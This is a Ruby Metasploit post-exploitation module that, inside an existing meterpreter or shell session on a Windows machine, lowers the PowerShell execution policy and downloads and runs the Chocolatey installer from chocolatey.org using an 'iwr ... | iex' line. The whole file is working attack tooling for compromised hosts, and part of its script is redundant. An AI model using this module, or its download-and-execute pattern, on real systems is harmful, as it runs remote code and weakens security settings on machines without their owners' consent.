# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Powershell

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Windows Manage Choco Chocolatey_Install_Module',
        'Description'   => %q{
          Easy installer to use the Chocolatey install manager. For all you dependency needs.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Habitual' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))
  end

  def run
    # Build the choco install script.
    script = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";'
    script << "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned;"
    script << "$script = New-Object Net.WebClient;"
    script << '$script.DownloadString("https://chocolatey.org/install.ps1");'
    script << "iwr https://chocolatey.org/install.ps1 -UseBasicParsing | iex;"
    psh_exec(script)
    puts "Chocolatey install in ProgramData. Navigate to that folder to download packages."
    return

  end

end

